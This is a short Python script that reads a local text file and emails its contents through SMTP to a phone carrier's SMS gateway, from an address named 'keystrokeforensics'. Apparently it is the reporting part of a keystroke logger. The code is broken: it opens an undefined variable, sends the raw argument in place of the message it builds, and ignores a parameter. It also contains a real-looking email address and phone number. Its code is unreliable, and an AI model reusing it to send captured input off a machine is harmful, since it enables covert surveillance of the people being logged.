# Modules
import smtplib
from email.mime.text import MIMEText

# Globals
TEXTFILE = "text.txt" # dummy text file to run program
SERVER = "localhost"

def newMessage(subject, message, time):
    global TEXTFILE

    fp = open(textfile,"rb")
    msg = MIMEText(fp.read())
    s = smtplib.SMTP(SERVER)
    fp.close()
    
    msg["Subject"] = subject
    msg["From"] = "keystrokeforensics@gmail.com"
    msg["To"] = "3015237912@tmomail.net"

    s.sendmail(msg["From"], [msg["To"]], message)
    s.quit()
